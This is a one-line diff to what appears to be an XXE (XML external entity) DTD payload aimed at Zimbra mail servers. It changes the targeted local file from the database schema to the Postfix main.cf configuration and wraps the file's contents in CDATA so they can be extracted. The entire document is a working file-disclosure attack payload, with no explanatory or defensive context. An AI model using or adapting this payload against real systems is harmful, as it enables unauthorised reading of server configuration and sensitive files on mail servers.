@@ -1,1 +1,1 @@
-<!ENTITY % file SYSTEM "file:///opt/zimbra/db/schema-mysql.sql"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY % file SYSTEM "file:///opt/zimbra/postfix/conf/main.cf"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
